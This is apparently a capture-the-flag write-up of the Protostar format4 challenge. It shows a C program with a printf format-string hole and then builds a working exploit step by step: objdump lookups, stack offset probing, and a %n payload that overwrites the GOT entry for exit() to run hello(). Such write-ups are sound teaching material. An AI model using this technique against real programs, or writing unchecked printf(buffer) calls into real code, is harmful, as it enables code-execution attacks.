Let's take a look at the source code...

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);   
}

int main(int argc, char **argv)
{
  vuln();
}
```

So from looking at the code, it shares the same vulnerabillity as the previous problems. However, this time we are going to have to redirect the program execuituon in order to execute the hello() function.
In order to do this, we can just rewrite the address for the exit() function in the Global Offset Table (GOT). We shouldn't be able to overwrite the EIP addrss, since the exit function is called before it returns.

The first thing we will need to do is to find the addrsss of the exit function.

```
objdump -TR ./format4 | grep exit
00000000   F *UND* 00000000   _exit@@GLIBC_2.0
00000000   F *UND* 00000000   exit@@GLIBC_2.0
08049718 R_386_JUMP_SLOT  _exit
08049724 R_386_JUMP_SLOT  exit
```
Keep in mind, this function lies in the dynamic relocation records, so that's why we had to use those specific flags. There are two functions with the string "exit" which are _exit() and exit(), we are only interested in exit().
So the address we need for exit is 0x08049724

Now we need to find the address of the hello() function.

```
objdump -t ./format4 | grep hello
080484b4 g    F .text 0000001e        hello
```
And we have the address of the hello() function which is 0x080484b4

The next step is to see how many DWORDS are between our input on the stack and where our format string is processed. Since our input is taken in a fgets right before it is printed, it shouldn't be too far away.

```
python -c 'print "0000" + ".%x"*10' | ./format4
0000.200.b7d8420.bffffb84.30303030.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78
```

And from there it appears that our input 0000 (which in hex is 30303030) is four DWORDS away. Let's confirm that

```
python -c 'print "0000" + ".%x"*4' | ./format4
0000.200.b7d8420.bffffb84.30303030
```
Ok now that we have the offset, and the addresses of the exit() and hello() functions, let's test our exploit in gdb/

```
python -c 'print "\x24\x97\x04\x08" + "%4$n"' > /tmp/payload
gdb ./format4
r < /tmp/payload
Starting program: /opt/protostar/bin/format4 < /tmp/payload
$

Program received singnal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()
```

So this is good. It means that our exploit did work, however it overwrote the exit() function with 4. We need to overwrite it with 0x080484b4. We can just fill the difference by writing additional bytes. 0x080484b4 - 4 = 134513840.
So our final exploit is (this will take a couple of minutes to run).

```
python -c 'print "\x24\x97\x04\x08" + "%134513840x" + "%4$n"' | ./format4
```
And after a couple of minutes...

```
code execution redirected! you win
```
And just like that we pwned the program

Sources:
http://secwriteups.blogspot.com/2014/12/protostar-format-4.html
